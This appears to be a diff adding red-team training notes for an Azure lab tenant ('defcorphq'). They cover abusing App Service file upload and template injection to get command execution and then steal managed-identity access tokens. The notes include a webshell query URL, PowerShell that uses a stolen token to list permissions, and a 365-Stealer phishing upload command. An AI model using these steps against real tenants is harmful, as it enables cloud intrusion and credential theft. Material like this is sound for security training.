@@ -114,3 +114,90 @@ Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx
 ```
 python C:\xampp\htdocs\365-Stealer\365-Stealer.py -- refresh-user MarkDWalden@defcorphq.onmicrosoft.com --upload C:\AzAD\Tools\studentx.doc
 ```
+# App Services
+
+•  "Azure App Service is an HTTP-based service for hosting web applications, REST APIs, and mobile back ends."
+
+•  Supports both Windows and Linux environments.
+
+•  .NET, .NET Core, Java, Ruby, Node.js, PHP, or Python are supported.
+
+•  Each app runs inside a sandbox but isolation depends upon App Service plans
+
+– Apps in Free and Shared tiers run on shared VMs
+
+– Apps in Standard and Premium tiers run on dedicated VMs
+
+•  Windows apps (not running in Windows containers) have local drives, UNC shares, outbound network connectivity (unless restricted), read access to Registry and event logs.
+
+•  In the above case, it is also possible to run a PowerShell script and command shell. But the privileges will be of a the low-privileges workers process that uses a random application pool identity.
+
+•  While there are default security features available with App Service (sandboxing/isolation, encrypted communication etc.), vulnerabilities in the code deployed are abusable.
+
+•  The classic web app vulnerabilities like SQL Injection, Insecure file upload, Injection attacks etc. do not disappear magically :)
+
+- We will discuss the following:
+  - Insecure File upload
+  - Server Side Template Injection
+  - OS Command Injection
+
+•  By abusing an insecure file upload vulnerability in an app service, it is possible to get command execution.
+
+•  As discussed previously, the privileges will be of the low-privilege
+worker process.
+
+•  But if the app service uses a Managed Identity, we may have the ability
+to have interesting permissions on other Azure resources.
+
+•  After compromising an app service, we can request access tokens for the managed identity.
+
+•  If the app service contains environment variables IDENTITY_HEADER
+and IDENTITY_ENDPOINT, it has a managed identity.
+
+```
+http://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
+```
+•  Get the access token for the managed identity using another webshell https://defcorphqcareer.azurewebsites.net/uploads/studen txtoken.phtml
+•  You can find both of the above web shells in the Tools directory.
+
+•     Check the resources available to the managed identity (using the access token and client ID)
+```
+$token = 'eyJ0eX...'
+
+Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
+```
+•     Check the permissions of the managed identity on the virtual machine from above:
+
+```
+$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11- d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/provide rs/Microsoft.Authorization/permissions?api-version=2015-07-01'
+
+
+$RequestParams = @{ Method = 'GET' Uri     = $URI Headers = @{
+'Authorization' = "Bearer $Token"
+}
+}
+(Invoke-RestMethod @RequestParams).value
+```
+
+Note: There should be no need to use the above code. Get-AZRoleAssignment gives the correct result in case a user's token is used. But throws an error in case token of a manage identity is used.
+
+
+•  The career app in the defcorphq tenant allows insecure file upload functionality. Abuse the vulnerability and compromise the app service.
+
+•  Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.
+
+•  SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side.
+
+•  That is, we can get command execution on a server by abusing this.
+
+•  Once again, in case of an Azure App Service, we get privileges only of
+the worker process but a managed identity may allow us to access other
+Azure resources.
+
+•  An application in the defcorphq tenant is vulnerable to SSTI. Find the application and compromise the app service.
+
+•  Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.
+
+
+
+
